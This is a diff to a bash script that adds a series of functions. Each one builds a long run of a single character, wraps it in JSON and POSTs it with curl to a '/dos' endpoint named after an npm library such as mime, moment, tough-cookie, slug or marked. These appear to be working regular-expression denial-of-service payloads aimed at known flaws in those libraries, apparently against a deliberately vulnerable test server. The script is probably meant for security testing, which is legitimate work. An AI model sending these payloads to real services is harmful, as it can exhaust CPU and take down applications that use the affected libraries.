@@ -91,14 +91,74 @@ runLodashDos() {
     curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
 }
 
+runMimeDos(){
+    fin="$(generate 81750 "5")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
+}
+
+runMobileDetectDos(){
+    fin="$(generate 12500 "Dell")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
+}
+
+runMomentDos(){
+    fin="$(generate 50000 "1")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
+}
+
+runNoCaseDos(){
+    fin="$(generate 50000 "X")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
+}
+
+runParsejsonDos(){
+    fin="$(generate 50000 " ")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
+}
+
+runPlatformDos(){
+    fin="$(generate 30000 " ")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
+}
+
+runSlugDos(){
+    fin="$(generate 50000 " ")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/slug/dos
+}
+
+runStringDos(){
+    fin="$(generate 50000 "9")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/string/dos
+}
+
+runToughCookieDos(){
+    fin="$(generate 50000 " ")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/tough_cookie/dos
+}
+
+runTimespanDos(){
+    fin="$(generate 30000 "1")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/timespan/dos
+}
+
+runUnderscoreStringDos(){
+    fin="$(generate 50000 "&")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/underscore_string/dos
+}
 #how do I generate multiple text?
 runMarkedDos() {
     fin="$(generate 8 "\`")$(generate 700 " ")$(generate 11 "\`")"
     makeJson $fin
     curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/marked/dos
 }
-
-
-
-
-
